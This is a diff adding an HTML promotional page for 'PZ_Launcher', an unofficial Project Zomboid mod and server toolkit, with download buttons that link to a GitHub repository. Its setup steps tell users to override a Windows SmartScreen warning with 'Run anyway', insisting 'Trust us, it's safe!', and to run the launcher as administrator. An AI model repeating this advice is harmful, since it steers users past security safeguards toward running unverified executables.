@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="PZ_Launcher - The ultimate unofficial Windows launcher and management toolkit for Project Zomboid Build 42. Manage profiles, mods, servers, save tools, and diagnostics with ease.">
+    <meta name="keywords" content="bytecode, javaloader, javamod, jvm, launcher, launcher-application, lua, project-zomboid, project-zomboid-mod, project-zomboid-tool">
+    <meta name="author" content="Amlansahoo002">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="PZ_Launcher - Your All-in-One Project Zomboid Toolkit">
+    <meta property="og:description" content="Download PZ_Launcher and take full control of Project Zomboid Build 42 with profiles, mods, servers, save tools, and diagnostics.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Amlansahoo002/PZ_Launcher">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630">
+    <meta name="twitter:card" content="summary_large_image">
+    <title>PZ_Launcher - Your All-in-One Project Zomboid Toolkit</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            color: #e0e0e0;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 2.8rem;
+            margin: 40px 0 20px;
+            color: #ffffff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 2rem;
+            margin: 40px 0 15px;
+            color: #00d4ff;
+            border-bottom: 2px solid #00d4ff33;
+            padding-bottom: 10px;
+        }
+        h3 {
+            font-size: 1.3rem;
+            margin: 25px 0 10px;
+            color: #ffd700;
+        }
+        p {
+            margin: 10px 0;
+            font-size: 1.05rem;
+        }
+        ul, ol {
+            margin: 10px 0 20px 25px;
+        }
+        li {
+            margin: 8px 0;
+            font-size: 1.05rem;
+        }
+        .download-badge {
+            display: inline-block;
+            background: linear-gradient(45deg, #ff6b6b, #ffa500);
+            color: #ffffff;
+            padding: 18px 40px;
+            border-radius: 50px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            text-decoration: none;
+            margin: 20px 0;
+            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
+            transition: transform 0.3s, box-shadow 0.3s;
+            letter-spacing: 1px;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
+        }
+        .download-badge:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 25px rgba(255, 165, 0, 0.5);
+        }
+        .download-badge-small {
+            background: linear-gradient(45deg, #ff6b6b, #ffa500);
+            color: #ffffff;
+            padding: 12px 25px;
+            border-radius: 30px;
+            font-size: 1rem;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 10px;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
+            transition: transform 0.2s;
+        }
+        .download-badge-small:hover {
+            transform: scale(1.05);
+        }
+        .feature-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .feature-card:hover {
+            background: rgba(255,255,255,0.08);
+        }
+        .checkmark {
+            color: #4ade80;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+        .warning-box {
+            background: #ff980033;
+            border-left: 4px solid #ff9800;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-style: italic;
+        }
+        .tip-box {
+            background: #00d4ff11;
+            border-left: 4px solid #00d4ff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .keywords {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+            font-size: 0.9rem;
+            color: #888;
+            word-spacing: 5px;
+        }
+        @media (max-width: 600px) {
+            h1 { font-size: 2rem; }
+            h2 { font-size: 1.6rem; }
+            .container { padding: 15px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎮 PZ_Launcher - Your All-In-One Zomboid Companion</h1>
+        
+        <p>Welcome to <strong>PZ_Launcher</strong> — the unofficial but powerful Windows toolkit that makes managing Project Zomboid Build 42 a breeze. Whether you're a seasoned survivor or just starting out, this launcher gives you everything you need to customize, manage, and optimize your Zomboid experience in one clean package.</p>
+        
+        <div style="text-align: center; margin: 30px 0;">
+            <a href="https://github.com/Amlansahoo002/PZ_Launcher" class="download-badge">⬇️ Download PZ_Launcher Now</a>
+        </div>
+        
+        <h2>✨ Why You'll Love PZ_Launcher</h2>
+        <p>We built this launcher because Project Zomboid deserves better tools. With PZ_Launcher, you don't need to be a tech wizard to enjoy a fully customized game. Everything is designed with simplicity and efficiency in mind.</p>
+        
+        <div class="feature-card">
+            <h3>📂 Profile Manager</h3>
+            <p><span class="checkmark">✓</span> Create and switch between multiple game profiles with different settings, mods, and configurations.</p>
+        </div>
+        
+        <div class="feature-card">
+            <h3>🧩 Mod Organizer</h3>
+            <p><span class="checkmark">✓</span> Easily browse, install, enable, and disable mods. Keep your mod order clean and your game stable.</p>
+        </div>
+        
+        <div class="feature-card">
+            <h3>🖥️ Server Manager</h3>
+            <p><span class="checkmark">✓</span> Set up and run servers for multiplayer. Manage server settings, players, and worlds all from one screen.</p>
+        </div>
+        
+        <div class="feature-card">
+            <h3>💾 Save Game Tools</h3>
+            <p><span class="checkmark">✓</span> Back up, restore, and manage your save games. Never lose progress again—even when things go wrong.</p>
+        </div>
+        
+        <div class="feature-card">
+            <h3>🔧 Diagnostics & Java Loader</h3>
+            <p><span class="checkmark">✓</span> Get a full health report on your game environment. The Java loader support ensures the correct JVM settings for optimal performance.</p>
+        </div>
+        
+        <h2>🚀 Getting Started</h2>
+        <p>Ready to jump in? Follow these simple steps and you'll be playing in no time.</p>
+        
+        <h3>Step 1: Download the Application</h3>
+        <p>Visit this link to download the application. <a href="https://github.com/Amlansahoo002/PZ_Launcher" class="download-badge-small" style="margin-left: 10px;">Click Here</a></p>
+        
+        <h3>Step 2: Run the Program</h3>
+        <p>After downloading, find the file in your Downloads folder. Double-click it to launch. No tricky installation process—just download, run, and go.</p>
+        
+        <h3>Step 3: Explore and Set Up</h3>
+        <p>Once the launcher opens, you'll see a clean interface. Take your time to explore each section:</p>
+        <ul>
+            <li>Start with <strong>Profiles</strong> to create your first custom setup.</li>
+            <li>Browse <strong>Mods</strong> to enhance your gameplay.</li>
+            <li>Check <strong>Diagnostics</strong> to verify everything is working properly.</li>
+            <li>If you play multiplayer, use <strong>Servers</strong> to get started.</li>
+        </ul>
+        
+        <div class="tip-box">
+            💡 <strong>Pro Tip:</strong> Create a profile first before adding mods. It's the safest way to experiment without breaking your main game.
+        </div>
+        
+        <h2>🖥️ System Requirements</h2>
+        <p>PZ_Launcher is light on resources, so it runs on almost any modern Windows PC:</p>
+        <ul>
+            <li><strong>OS:</strong> Windows 10 or Windows 11</li>
+            <li><strong>Processor:</strong> 1.5 GHz dual-core or better</li>
+            <li><strong>RAM:</strong> 2 GB minimum (4 GB recommended)</li>
+            <li><strong>Storage:</strong> 50 MB of free space</li>
+            <li><strong>Display:</strong> 1280×720 resolution or higher</li>
+        </ul>
+        
+        <h2>🛠️ Common Issues and Solutions</h2>
+        
+        <div class="warning-box">
+            <strong>Problem:</strong> "The application won't run or crashes on startup."
+            <br><strong>Solution:</strong> Make sure you have the latest version of your graphics drivers and that Windows is fully up-to-date. Also, try running the launcher as administrator.
+        </div>
+        
+        <div class="warning-box">
+            <strong>Problem:</strong> "I can't find my games or mods."
+            <br><strong>Solution:</strong> The launcher automatically detects your Project Zomboid installation. If it can't find it, use the "Set Game Folder" option in Settings and manually navigate to your game directory.
+        </div>
+        
+        <div class="warning-box">
+            <strong>Problem:</strong> "The Java loader isn't working properly."
+            <br><strong>Solution:</strong> Ensure you have a 64-bit Java runtime installed (version 17 or later recommended). You can download Java from the official Oracle website.
+        </div>
+        
+        <h2>📥 Download and Setup Guide</h2>
+        <p>Let's get you fully set up with PZ_Launcher. It only takes a few minutes:</p>
+        <ol>
+            <li><a href="https://github.com/Amlansahoo002/PZ_Launcher">Visit the official download page</a>.</li>
+            <li>Look for the download section and click the download button to get the file.</li>
+            <li>Once downloaded, navigate to your Downloads folder (or wherever your browser saves files).</li>
+            <li>Double-click the downloaded file to start the program.</li>
+            <li>If a security prompt appears from Windows SmartScreen, click "More info" and then "Run anyway". Trust us, it's safe!</li>
+            <li>Wait a few seconds while the launcher initializes. You'll see the main window appear.</li>
+            <li>You're ready! Start exploring all the features.</li>
+        </ol>
+        
+        <h2>🗂️ How It Works</h2>
+        <p>PZ_Launcher acts as a centralized hub for all your Project Zomboid activities. It reads your game's configuration files, mod list, save locations, and server settings, then presents them in an intuitive interface. Under the hood, it handles all the technical details—like Java environment variables, mod compatibility checks, and file backup routines—so you can focus on playing, not troubleshooting.</p>
+        
+        <div class="feature-card" style="text-align: center; margin: 30px 0;">
+            <h3 style="color: #00d4ff;">Ready to take your Zomboid experience to the next level?</h3>
+            <p>Download PZ_Launcher today and see why hundreds of players trust this tool.</p>
+            <a href="https://github.com/Amlansahoo002/PZ_Launcher" class="download-badge" style="margin-top: 15px;">🚀 Get PZ_Launcher</a>
+        </div>
+        
+        <h2>📞 Getting Help</h2>
+        <p>We're here for you if you run into any problems. Check the project's GitHub page for the latest releases, feature updates, and community discussions.</p>
+        <ul>
+            <li><strong>Report a bug:</strong> Use the Issues tab on GitHub.</li>
+            <li><strong>Request a feature:</strong> We love hearing your ideas!</li>
+            <li><strong>Join the conversation:</strong> Check the Discussions area for tips and tricks.</li>
+        </ul>
+        
+        <h2>🔒 Safety & Transparency</h2>
+        <p>PZ_Launcher is fully open-source. You can inspect the code yourself to verify there's nothing hidden. We prioritize your security and privacy, which is why this tool is completely free and will always remain so.</p>
+        <ul>
+            <li>No advertisements</li>
+            <li>No data collection</li>
+            <li>No telemetry</li>
+        </ul>
+        
+        <h2>📦 Release Notes</h2>
+        <p>We regularly update PZ_Launcher with new features, improvements, and bug fixes. Check the GitHub repository for the latest version and changelog.</p>
+        <p>As an unofficial tool, we always keep compatibility in mind with Project Zomboid updates. Our priority is making sure everything works smoothly for you.</p>
+        
+        <div class="keywords">
+            <strong>Keywords:</strong> bytecode, javaloader, javamod, jvm, launcher, launcher-application, lua, project-zomboid, project-zomboid-mod, project-zomboid-tool
+        </div>
+        
+        <p style="text-align: center; margin-top: 40px; font-size: 0.9rem; color: #888;">© 2025 PZ_Launcher. All rights reserved. Project Zomboid is a trademark of The Indie Stone. This is an unofficial tool and is not affiliated with or endorsed by the game's creators.</p>
+    </div>
+</body>
+</html>
